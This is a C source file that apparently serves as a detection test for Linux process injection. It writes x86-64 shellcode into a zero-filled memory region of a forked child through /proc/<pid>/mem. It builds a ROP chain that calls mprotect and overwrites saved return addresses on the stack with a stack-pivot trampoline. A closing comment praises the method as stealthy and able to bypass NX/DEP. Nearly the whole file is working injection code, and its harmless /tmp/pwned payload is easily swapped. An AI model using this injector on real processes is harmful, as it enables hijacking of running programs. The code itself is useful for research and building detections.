#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <ctype.h>
#include <elf.h>
#include <sys/mman.h>

unsigned char shellcode[] = {
    // --- open("/tmp/pwned", O_CREAT|O_WRONLY, 0644) ---
    0x48, 0x8d, 0x3d, 0x25, 0x00, 0x00, 0x00,  // lea rdi, [rip + 0x25]   ; path
    0xb8, 0x02, 0x00, 0x00, 0x00,              // mov eax, 2              ; sys_open
    0xbe, 0x41, 0x00, 0x00, 0x00,              // mov esi, 0x41           ; O_CREAT|O_WRONLY
    0xba, 0xa4, 0x01, 0x00, 0x00,              // mov edx, 0x1a4          ; 0644
    0x0f, 0x05,                                // syscall
    // --- close(fd) ---
    0x48, 0x89, 0xc7,                          // mov rdi, rax            ; fd
    0xb8, 0x03, 0x00, 0x00, 0x00,              // mov eax, 3              ; sys_close
    0x0f, 0x05,                                // syscall
    // --- exit(0) ---
    0xb8, 0x3c, 0x00, 0x00, 0x00,              // mov eax, 60             ; sys_exit
    0x48, 0x31, 0xff,                          // xor rdi, rdi
    0x0f, 0x05,                                // syscall
    // --- path: ---
    0x2f, 0x74, 0x6d, 0x70, 0x2f,              // "/tmp/"
    0x70, 0x77, 0x6e, 0x65, 0x64,              // "pwned"
    0x00                                       // '\0'
};
unsigned int shellcode_len = sizeof(shellcode);

#define MAX_LOOPS 100
#define CHUNK_SIZE (size_t)sysconf(_SC_PAGESIZE)

typedef struct {
    const uint8_t  *bytes;
    size_t          len;
    uint64_t        addr;
} Gadget;

pid_t create_victim_child_process() {
    pid_t pid = fork();
    if (pid < 0) {
        return 0;
    } else if (pid == 0) {
        sleep(2);
        exit(0);
    }
    usleep(200000);
    return pid;
}

ssize_t write_in_mem(long addr, pid_t pid, unsigned char *buffer, size_t len) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);

    int fd = open(path, O_RDWR);
    if (fd < 0) return -1;

    if (lseek(fd, (off_t)addr, SEEK_SET) == (off_t)-1) {
        close(fd);
        return -2;
    }

    ssize_t ret = write(fd, buffer, len);

    close(fd);
    return ret;
}

int read_mem(void *buf, pid_t pid, uintptr_t address, size_t len) {
    char filepath[256];
    snprintf(filepath, sizeof(filepath), "/proc/%d/mem", pid);

    FILE *file = fopen(filepath, "r");
    if (!file) return -1;

    if (fseeko(file, (off_t)address, SEEK_SET) != 0) {
        fclose(file);
        return -2;
    }

    if (fread(buf, 1, len, file) != len) {
        fclose(file);
        return -3;
    }

    fclose(file);
    return 0;
}

void print_mem(unsigned char* buffer, long size) {
    for (size_t i = 0; i < size; i += 16) {
        printf("%06zx  ", i);
        for (size_t j = 0; j < 16; j++) {
            if (i + j < size)
                printf("%02x ", buffer[i + j]);
            else
                printf("   ");
            if (j == 7) printf(" ");
        }
        printf("\n");
    }
}

long get_reg(pid_t pid, const char* reg) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/syscall", pid);

    char buffer[256];
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;

    //try to read registers until they become available
    ssize_t bytesRead;
    int i=0;
    while (i < MAX_LOOPS && (bytesRead = pread(fd, buffer, sizeof(buffer) - 1, 0)) > 0) {
        if (strncmp(buffer, "running", 7) != 0) break;

        i++;
        usleep(1000); 
    }

    close(fd);
    if (bytesRead <= 0) return -1;
    buffer[bytesRead] = '\0';

    long syscall, rdi, rsi, rdx, r10, r8, r9, rsp, rip;
    int n = sscanf(buffer, "%ld %lx %lx %lx %lx %lx %lx %lx %lx",
                &syscall, &rdi, &rsi, &rdx, &r10, &r8, &r9, &rsp, &rip);

    if (n < 9) return -1;

    if (strcmp(reg, "syscall") == 0) return syscall;
    if (strcmp(reg, "rdi") == 0)     return rdi;
    if (strcmp(reg, "rsi") == 0)     return rsi;
    if (strcmp(reg, "rdx") == 0)     return rdx;
    if (strcmp(reg, "r10") == 0)     return r10;
    if (strcmp(reg, "r8") == 0)      return r8;
    if (strcmp(reg, "r9") == 0)      return r9;
    if (strcmp(reg, "rsp") == 0)     return rsp;
    if (strcmp(reg, "rip") == 0)     return rip;

    return -1;
}

long find_zeroed_writable_cave(pid_t pid, size_t required_len) {
    char maps_path[256], mem_path[256];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);

    FILE *maps_file = fopen(maps_path, "r");
    int mem_fd = open(mem_path, O_RDONLY);
    if (!maps_file || mem_fd < 0) {
        if (maps_file) fclose(maps_file);
        if (mem_fd >= 0) close(mem_fd);
        return -1;
    }

    char line[512];
    long found_addr = -1;
    unsigned char *zeros = calloc(1, required_len); 

    while (fgets(line, sizeof(line), maps_file)) {
        long start, end;
        char perms[5];
        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) != 3) continue;
        if (perms[1] != 'w') continue;
        
        size_t size = end - start;
        if (size < required_len) continue;
        if (size > 1024 * 1024 * 5) size = 1024 * 1024 * 5; 

        unsigned char *buffer = malloc(size);
        if (!buffer) continue;

        if (pread(mem_fd, buffer, size, start) > 0) {
            unsigned char *match = memmem(buffer, size, zeros, required_len);
            if (match) {
                found_addr = start + (match - buffer);
                free(buffer);
                break;
            }
        }
        free(buffer);
    }
    free(zeros);
    fclose(maps_file);
    close(mem_fd);
    return found_addr;
}

long find_gadgets(int pid, Gadget *gadgets, int num_gadgets) {
    char maps_path[256], mem_path[256];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);

    FILE *maps_file = fopen(maps_path, "r");
    int mem_fd = open(mem_path, O_RDONLY);

    if (!maps_file || mem_fd < 0) {
        if (maps_file) fclose(maps_file);
        if (mem_fd >= 0) close(mem_fd);
        return -1;
    }

    size_t max_gadget_len = 0;
    for (int i = 0; i < num_gadgets; i++) {
        if (gadgets[i].len > max_gadget_len) max_gadget_len = gadgets[i].len;
    }
    size_t overlap = max_gadget_len - 1;
    unsigned char *buffer = malloc(CHUNK_SIZE);
    if (!buffer) {
        fclose(maps_file); close(mem_fd); return -1;
    }

    char line[512];
    long found = 0;

    while (fgets(line, sizeof(line), maps_file)) {
        long start, end;
        char perms[5];
        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) != 3) continue;
        if (strchr(perms, 'x') == NULL) continue;

        long current_addr = start;
        while (current_addr < end) {
            size_t bytes_to_read = end - current_addr;
            if (bytes_to_read > CHUNK_SIZE) bytes_to_read = CHUNK_SIZE;

            ssize_t bytes_read = pread(mem_fd, buffer, bytes_to_read, current_addr);
            if (bytes_read <= 0) break;

            for (int i = 0; i < num_gadgets; i++) {
                if (gadgets[i].addr != 0) continue;
                unsigned char *match = memmem(buffer, bytes_read, gadgets[i].bytes, gadgets[i].len);
                if (match) {
                    gadgets[i].addr = current_addr + (match - buffer);
                    found++;
                }
            }
            if (found == num_gadgets) {
                free(buffer); fclose(maps_file); close(mem_fd); return found;
            }
            if (current_addr + bytes_read < end) {
                current_addr += (bytes_read - overlap);
            } else break; 
        }
    }
    free(buffer); fclose(maps_file); close(mem_fd);
    return found;
}

int find_pop_rdx_variant(pid_t pid, uint64_t *out_addr, int *out_extra_pops) {
    static const struct {
        const uint8_t *bytes;
        size_t         len;
        int            extra_pops;
        const char    *desc;
    } variants[] = {
        { (const uint8_t*)"\x5a\xc3",         2, 0, "pop rdx; ret" },
        { (const uint8_t*)"\x5a\x5b\xc3",     3, 1, "pop rdx; pop rbx; ret" },
        { (const uint8_t*)"\x5a\x5d\xc3",     3, 1, "pop rdx; pop rbp; ret" },
        { (const uint8_t*)"\x5a\x5e\xc3",     3, 1, "pop rdx; pop rsi; ret" },
        { (const uint8_t*)"\x5a\x5f\xc3",     3, 1, "pop rdx; pop rdi; ret" },
        { (const uint8_t*)"\x5a\x41\x5c\xc3", 4, 1, "pop rdx; pop r12; ret" },
        { (const uint8_t*)"\x5a\x41\x5d\xc3", 4, 1, "pop rdx; pop r13; ret" },
        { (const uint8_t*)"\x5a\x41\x5e\xc3", 4, 1, "pop rdx; pop r14; ret" },
        { (const uint8_t*)"\x5a\x41\x5f\xc3", 4, 1, "pop rdx; pop r15; ret" },
    };
    int n = sizeof(variants) / sizeof(variants[0]);

    Gadget candidates[n];
    for (int i = 0; i < n; i++) {
        candidates[i].bytes = variants[i].bytes;
        candidates[i].len   = variants[i].len;
        candidates[i].addr  = 0;
    }

    find_gadgets(pid, candidates, n);

    for (int i = 0; i < n; i++) {
        if (candidates[i].addr != 0) {
            *out_addr       = candidates[i].addr;
            *out_extra_pops = variants[i].extra_pops;
            printf("[+] %-26s @ 0x%lx  (dummies=%d)\n",
                   variants[i].desc, *out_addr, *out_extra_pops);
            return 0;
        }
    }
    return -1;
}

uint64_t* build_mprtect_rop_chain(long address, pid_t pid, size_t region_size, size_t *out_count) {
    Gadget gadgets[] = {
        { (uint8_t*)"\x5f\xc3",         2, 0 }, // pop rdi; ret
        { (uint8_t*)"\x5e\xc3",         2, 0 }, // pop rsi; ret
        { (uint8_t*)"\x58\xc3",         2, 0 }, // pop rax; ret
        { (uint8_t*)"\x0f\x05\xc3",     3, 0 }, // syscall; ret
    };
    int n = sizeof(gadgets) / sizeof(gadgets[0]);

    int found = find_gadgets(pid, gadgets, n);
    if (found < n) {
        fprintf(stderr, "[-] Not all base gadgets found (%d/%d)\n", found, n);
        return NULL;
    }

    uint64_t pop_rdi_ret = gadgets[0].addr;
    uint64_t pop_rsi_ret = gadgets[1].addr;
    uint64_t pop_rax_ret = gadgets[2].addr;
    uint64_t syscall_ret = gadgets[3].addr;

    uint64_t pop_rdx_gadget = 0;
    int      pop_rdx_extra  = 0;
    if (find_pop_rdx_variant(pid, &pop_rdx_gadget, &pop_rdx_extra) != 0) {
        fprintf(stderr, "[-] No pop rdx variant found in target libc\n");
        return NULL;
    }

    size_t count = 10 + (size_t)pop_rdx_extra;
    uint64_t *rop_chain = malloc(count * sizeof(uint64_t));
    if (!rop_chain) return NULL;

    long page_size    = sysconf(_SC_PAGESIZE);
    long offset       = address % page_size;
    long aligned_addr = address - offset;
    long aligned_len  = region_size + offset;

    size_t i = 0;
    rop_chain[i++] = pop_rdi_ret;
    rop_chain[i++] = aligned_addr;                  // RDI
    rop_chain[i++] = pop_rsi_ret;
    rop_chain[i++] = aligned_len;                   // RSI
    rop_chain[i++] = pop_rdx_gadget;
    rop_chain[i++] = 5;                             // RDX
    
    for (int k = 0; k < pop_rdx_extra; k++) {
        rop_chain[i++] = 0xdeadbeefdeadbeefULL;
    }
    
    rop_chain[i++] = pop_rax_ret;
    rop_chain[i++] = 10;                            // SYS_mprotect
    rop_chain[i++] = syscall_ret;
    rop_chain[i++] = address;                       // jump to shellcode

    *out_count = i;
    return rop_chain;
}

int overwrite_possible_ret_addrs(pid_t pid, long rsp, unsigned char *buffer, size_t len) {
    if (!buffer || len == 0) return -1;

    char maps_path[256], mem_path[256];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    snprintf(mem_path,  sizeof(mem_path),  "/proc/%d/mem",  pid);

    FILE *maps_file = fopen(maps_path, "r");
    if (!maps_file) return -1;

    long region_starts[64];
    long region_ends[64];
    int n_regions = 0;
    char *line = NULL;
    size_t line_len = 0;

    // gathering pointers to exec region
    while (getline(&line, &line_len, maps_file) != -1 && n_regions < 64) {
        long start, end;
        char perms[5];
        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) != 3) continue;
        if (strchr(perms, 'x') == NULL) continue;
        region_starts[n_regions] = start;
        region_ends[n_regions]   = end;
        n_regions++;
    }
    free(line);
    fclose(maps_file);

    if (n_regions == 0) return -1;

    uint64_t stack_dump[128];
    int fd = open(mem_path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t bytes_read = pread(fd, stack_dump, sizeof(stack_dump), rsp);
    close(fd);
    if (bytes_read <= 0) return -1;

    int num_elements = bytes_read / sizeof(uint64_t);

    // check exec region and overwriting
    int overwritten = 0;
    for (int i = 0; i < num_elements; i++) {
        uint64_t current_val = stack_dump[i];
        if (current_val  < 0x400000) continue;
        // exec memory check
        int in_exec = 0;
        for (int r = 0; r < n_regions; r++) {
            if (current_val >= (uint64_t)region_starts[r] && current_val < (uint64_t)region_ends[r]) {
                in_exec = 1;
                break;
            }
        }
        if (!in_exec) continue;

        long slot_addr = rsp + (long)i * sizeof(uint64_t);
        ssize_t w = write_in_mem(slot_addr, pid, buffer, len);
        if (w != (ssize_t)len) {
            fprintf(stderr, "[!] Failed overwrite at rsp+0x%lx\n", (long)i * sizeof(uint64_t));
            continue;
        }
        overwritten++;
    }
    return overwritten;
}


int main(int argc, char *argv[]) { 
    pid_t pid = create_victim_child_process();
    if (pid == 0) {
        fprintf(stderr, "[-] Failed to fork\n");
        exit(1);
    }
    printf("[+] target PID: %d\n", pid);

    Gadget pivot_gadget = { (const uint8_t *)"\x5c\xc3", 2, 0 }; // pop rsp; ret
    if (find_gadgets(pid, &pivot_gadget, 1) != 1) {
        fprintf(stderr, "[-] Pivot gadget 'pop rsp; ret' not found\n");
        exit(1);
    }
    printf("[+] Pivot gadget found at: 0x%lx\n", pivot_gadget.addr);
    
    // calculting necessary size to write the payload and the ROP chain
    size_t aligned_sc_len = (shellcode_len + 7) & ~7; 
    size_t rop_chain_size = 12 * sizeof(uint64_t);
    size_t total_alloc_size = aligned_sc_len + rop_chain_size;

    long target_address = find_zeroed_writable_cave(pid, total_alloc_size);
    if (target_address == -1) {
        fprintf(stderr, "[-] Writable memory region not found\n");
        exit(1);
    }
    long shellcode_addr = target_address;
    long fake_stack_addr = target_address + aligned_sc_len;
    printf("[+] Writable memory region found at: 0x%lx\n", target_address);
    
    // writing the shellcode
    if (write_in_mem(shellcode_addr, pid, (unsigned char *)shellcode, shellcode_len) != (ssize_t)shellcode_len) {
        fprintf(stderr, "[-] Failed to write payload into memory region\n");
        exit(1);
    }

    unsigned char MemRegion[shellcode_len];
    printf("[+] payload written succefully\n");
    if (read_mem(MemRegion, pid, shellcode_addr, shellcode_len) != 0) 
        fprintf(stderr, "[!] Warning: failed to read memory\n");
    printf("[+] memory region content after the overwrite: \n");
    print_mem(MemRegion, shellcode_len);

    // building the rop chain
    size_t rop_count = 0;
    uint64_t *rop_chain = build_mprtect_rop_chain(shellcode_addr, pid, total_alloc_size, &rop_count);
    if (rop_chain == NULL) {
        fprintf(stderr, "[-] ROP chain construction failed\n");
        exit(1);
    }
    printf("[+] ROP chain successfully built (Size: %zu QWORDs)\n", rop_count);

    // writing the rop chain
    rop_chain_size = rop_count * sizeof(uint64_t);
    if (write_in_mem(fake_stack_addr, pid, (unsigned char *)rop_chain, rop_chain_size) != (ssize_t)rop_chain_size) {
        perror("write_in_mem rop_chain");
        free(rop_chain);
        return -1;
    }
    printf("[+] ROP chain written succefully at 0x%lx\n", fake_stack_addr);
    free(rop_chain);

    long rsp = get_reg(pid, "rsp");
    if(rsp == -1) {
        return -1;
    }
    printf("[*] stack pointer: 0x%lx\n", rsp);

    size_t stack_scan_size = 1024;
    uint64_t *stack_dump = malloc(stack_scan_size);
    
    // gathering stack
    if (read_mem(stack_dump, pid, rsp, stack_scan_size) != 0) {
        perror("read_mem stack dump");
        free(stack_dump);
        exit(1);
    }

    uint64_t trampoline[2];
    trampoline[0] = pivot_gadget.addr;        
    trampoline[1] = fake_stack_addr;     

    // overwrite all possible return address candidates
    int n = overwrite_possible_ret_addrs(pid, rsp, (unsigned char *)&trampoline, sizeof(trampoline));
    if (n <= 0) {
        fprintf(stderr, "[-] No executable pointers overwritten on stack\n");
        exit(1);
    }
    printf("[+] Overwrote %d executable pointer(s)\n", n);

    printf("[+] Injection finished\n");
    exit(0); 
}

/**
 * This technique performs control-flow hijacking via Targeted Stack Pivoting
 * and Return Address Overwriting.
 * 
 * It first identifies a safe, zero-filled writable (rw-) memory region (a "Zero Cave")
 * by scanning /proc/<pid>/maps and /proc/<pid>/mem to avoid corrupting vital process data.
 * It writes the shellcode into this cave and immediately follows it with a dynamically 
 * constructed ROP chain, effectively creating a "Fake Stack".
 * This ROP chain is built to invoke mprotect (granting execution permissions) and dynamically
 * adapts to modern glibc constraints by padding multi-pop 'rdx' gadgets with dummy values.
 * 
 * After setting up the Fake Stack, it inspects the process stack (from the RSP register)
 * to locate potential saved return addresses. Instead of writing the full ROP chain directly
 * onto the target's stack, it overwrites these candidates with a minimal 16-byte "Trampoline"
 * consisting of a stack pivot gadget (pop rsp; ret) and the address of the Fake Stack.
 * The moment the CPU executes the next RET instruction, the stack pointer is pivoted,
 * execution is safely redirected into the ROP chain, and from there to the payload.
 * 
 * Compared to a standard "ROP chain + return address overwrite" variant,
 * this pivoting technique prevents catastrophic stack corruption caused by overlapping 
 * payloads when multiple return addresses are clustered together. 
 * Furthermore, by writing into a verified Zero Cave instead of arbitrary writable memory, 
 * it guarantees that no active program variables are destroyed before the payload triggers.
 * This makes the injection highly reliable, stealthy, and capable of bypassing NX/DEP 
 * protections without risking immediate segmentation faults.
 * 
 * Note: this test forks a child process to use as the injection target.
 * This allows the test to run on systems where ptrace_scope=1 (default on most Linux distributions),
 * where a process can only modify the memory of its own descendants.
 * This may differ from a real-world scenario where the attacker targets an arbitrary process,
 * but for the purpose of this test it preserves the detection-relevant behavior: the same syscalls and /proc/<pid>/mem
 * access patterns are generated regardless of the relationship between injector and target.
 * 
 * Injection inspired by Ori David in "The Definitive Guide to Linux Process Injection"
 * https://www.akamai.com/blog/security-research/the-definitive-guide-to-linux-process-injection
 */
